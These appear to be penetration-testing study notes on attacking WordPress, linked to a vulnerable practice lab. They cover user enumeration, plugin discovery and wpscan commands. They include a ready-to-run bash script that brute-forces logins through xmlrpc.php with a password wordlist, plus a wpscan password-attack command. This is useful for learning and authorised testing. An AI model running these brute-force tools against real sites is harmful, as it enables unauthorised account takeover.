----
> We can test WordPress vulns with this playground: [dvwp](https://github.com/vavkamil/dvwp)
----

# User enumeration

## Manual methods

### Author post

If we see "by someone" in a post, we can click that user and check the url looking for other users.

### wp-admin

We can check if *wp-admin* is available and start testing users checking hints provided by the error message.

## Tools

### wpscan

We can enumerate users with wpscan using *-e u* option.

```shell
wpscan --url http://{URL}:{PORT} -e u --api-token="{TOKEN}"
```

# Vulnerabilities enumeration

## Manual methods

### curl

We can check plugins and it's versions using curl:

```shell
curl -s -X GET "http://{URL}:{PORT}/" | grep plugins
```

Then we can use searchsploit for searching vulnerabilities available for that plugin/version:
```shell
searchsploit {PLUGIN_NAME}
```

### xmlrpc

The xmlrpc.php file is used by WordPress plugins and mobile apps to interact with website and do some tasks like publish content, refresh site or get information. We can brute-force it because we have unlimited attempts number to log-in with this file.

First of all, we need to check if xmlrpc.php is exposed, check available [methods](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/), and finally we can use an script like this for brute-forcing it:

```bash
#!/bin/bash

function ctrl_c() {
  echo -e "\n\n[!] Exiting..."
  exit 1
}

# Ctrl+C
trap ctrl_c SIGINT

function createXML() {
  password=$1

  xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{USERNAME}</value></param>
<param><value>$password</value></param>
</params>
</methodCall>"""

  echo $xmlFile > file.xml

  response=$(curl -s -X POST "http://{URL}:{PORT}/xmlrpc.php" -d@file.xml)

  if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then
    echo -e "\n[+] The password for user {USERNAME} is $password"
    rm file.xml
    exit 0
  fi
}

cat /usr/share/wordlists/rockyou.txt | while read password; do
  createXML $password
done

```

## Tools

### wpscan

We can get a token from [wpscan](https://wpscan.com/) and start scanning wordpress sites.

```shell
# With -e we can enumerate some stuff, for example with vp (vulnerable plugins) or u (users)
wpscan --url http://{URL}:{PORT} -e vp,u --api-token="{TOKEN}"
```

We can also brute-forcing log-in with this tool:
```shell
wpscan --url http://{URL}:{PORT} -U {USERNAME} -P /usr/share/wordlists/rockyou.txt
```
